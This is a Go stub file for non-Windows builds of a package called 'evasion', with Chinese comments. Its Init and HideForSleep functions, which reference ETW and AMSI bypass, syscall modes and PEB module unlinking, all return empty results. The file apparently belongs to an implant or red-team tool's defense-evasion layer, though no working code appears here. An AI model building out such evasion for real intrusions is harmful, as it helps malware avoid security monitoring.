//go:build !windows

// Package evasion 非 Windows 平台空实现（对抗功能仅 Windows 生效）。
package evasion

// Init 非 Windows 平台无对抗初始化。
func Init(etwOn, amsiOn bool, syscallMode string) error {
	return nil
}

// HideForSleep 非 Windows 平台不做模块摘链（PEB 结构是 Windows 专有）。
func HideForSleep(enabled bool) func() { return func() {} }
